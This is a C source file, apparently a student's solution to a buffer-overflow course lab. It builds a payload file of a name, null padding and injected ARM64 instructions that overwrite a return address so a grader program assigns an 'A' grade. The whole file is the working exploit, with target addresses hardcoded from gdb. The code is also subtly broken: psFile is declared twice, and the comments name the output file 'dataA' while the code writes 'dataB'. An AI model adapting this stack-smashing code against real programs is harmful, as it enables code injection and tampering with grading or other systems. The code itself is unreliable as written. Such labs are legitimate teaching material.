/*
 * Produces dataA file that contains student name, null byte, 
 * and padding to perform stack smashing. 
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "miniassembler.h"

/*
 * main function writes to "dataA" file to perform stack smashing,
 * causing the grader program to assign the A grade. 
 */
int main() {
    FILE *psFile; 
    unsigned int MOV, STRB, B; 

    /* write name and null terminator to file. 
    grader program will ... */ 
    char name[] = "Claire Shin";
    FILE *psFile = fopen("dataB", "wb");
    if (psFile == NULL) {
        perror("Error opening file"); 
        return 1;  /* Return error code if file opening fails */
    }
    fwrite(name, sizeof(char), sizeof(name) - 1, psFile);

    /* add padding so that buffer overflow can be performed 
    48 - 11 (length of name)= 37. */ 
    for (int i = 0; i < 37; i++) {
        fputc(0x00, psFile);
    }

    /* MOV grade A to register W0 using MiniAssembler */
    MOV = MiniAssembler_mov(0, 'A');
    fwrite(&MOV, sizeof(unsigned int), 1, psFile);

    /* STR A in register W0 into the address pointed by X1
    branch back to normal program flow after setting grade to A */
    STRB = MiniAssembler_strb(0, 1);
    fwrite(&STRB, sizeof(unsigned int), 1, psFile);

    /* B back to return address */ 
    /* 0x40087c is instruction address after getName returns
    0xffffffffea48 is the injected instruction address based on gdb */
    B = MiniAssembler_b(0xffffffffea48, 0x40087c);
    fwrite(&B, sizeof(unsigned int), 1, psFile);

    fclose(psFile);
    return 0;

}
